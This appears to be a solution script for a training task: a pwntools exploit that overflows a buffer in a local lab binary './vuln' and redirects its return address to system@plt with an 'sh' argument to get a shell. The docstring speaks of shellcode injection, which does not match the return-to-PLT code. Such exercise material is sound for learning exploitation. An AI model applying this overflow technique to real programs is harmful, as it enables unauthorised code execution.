#!/usr/bin/env python

"""
Solution (exploit) for use-shellcode task.

Use pwntools (https://docs.pwntools.com/en/stable/) to inject a shellcode and
overwrite the return address of reader() to jump to the shellcode.

The executable uses DEP, doesn't use canary and assumes ASLR is disabled.
To run an ASLR disabled shell, do:
   setarch $(uname -m) -R /bin/bash
"""

import random
import sys
from pwn import *

#elf = context.binary = ELF('./vuln')
#libc = elf.libc
binary = ELF("./vuln", checksec=False)
system_plt_address = binary.plt.system

# offset to return address
offset = 0x40+4


# Start process.
io = process("./vuln")
sh_address = 0x8048615

# Craft payload.
# After padding add the construct to call system@plt("sh").
# Use p32(address) to convert the address from hex integer to a byte string representation.

payload = flat(
   "A" * offset,
   system_plt_address,
   "B" * 4,
   sh_address
)
# Read prompt message.
msg = io.recvline()
io.sendline(payload)
# Read hello message.
msg = io.recvline()
# See if a shell is active.
msg = io.recv(timeout=1)
msg = io.recv(timeout=1)

# Yield control to user.
io.interactive()
